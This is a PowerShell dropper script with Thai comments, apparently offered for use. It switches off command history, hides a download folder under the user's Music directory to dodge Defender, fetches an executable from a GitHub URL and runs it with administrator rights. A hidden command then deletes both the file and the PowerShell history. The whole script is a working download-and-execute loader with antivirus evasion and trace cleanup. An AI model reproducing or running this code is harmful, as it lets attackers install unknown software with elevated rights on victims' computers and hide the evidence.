# 1. จัดการเรื่องประวัติ (เน้นความเงียบ)
try { Set-PSReadlineOption -HistorySaveStyle SaveNothing } catch {}
$ErrorActionPreference = 'SilentlyContinue'

# 2. ย้ายที่อยู่ไปไว้ใน 'Music' หรือ 'Videos' ของ User (โฟลเดอร์พวกนี้ Defender มักไม่เพ่งเล็งเท่า AppData)
$dir = "$env:USERPROFILE\Music\SystemCache"
if (-not (Test-Path $dir)) { New-Item -Path $dir -ItemType Directory -Force }
$output = "$dir\WinHelper.exe"
$url = "https://github.com/relaxwtf777-lang/cmd/raw/refs/heads/main/BASX.exe"

# 3. ดาวน์โหลดแบบใช้เทคนิค WebClient Direct (เลี่ยง Invoke-WebRequest ที่โดนดักง่าย)
if (Test-Path $output) { Remove-Item $output -Force }
try {
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($url, $output)
} catch {}

# 4. เช็คไฟล์และรัน (ใช้เทคนิค ShellExecute แทน Start-Process ปกติเพื่อเลี่ยงการโดนบล็อก)
if (Test-Path $output) {
    $sh = New-Object -ComObject Shell.Application
    # รันแบบ Admin (เลข 7 คือรันแบบปกติไม่โชว์หน้าต่างดำของ PS ค้าง)
    $sh.ShellExecute($output, "", "", "runas", 1)
    
    # ให้เวลาไฟล์เด้งขึ้นมา 3 วินาที
    Start-Sleep -Seconds 3
}

# 5. เปิดประวัติกลับมาและสั่ง CMD เก็บกวาด (รอ 15 วินาทีค่อยลบ)
try { Set-PSReadlineOption -HistorySaveStyle SaveIncrementally } catch {}
$historyPath = (Get-PSReadlineOption).HistorySavePath
$clean = "timeout /t 15 && del /f /q `"$output`" && del /f /q `"$historyPath`""
Start-Process cmd -ArgumentList "/c $clean" -WindowStyle Hidden

exit
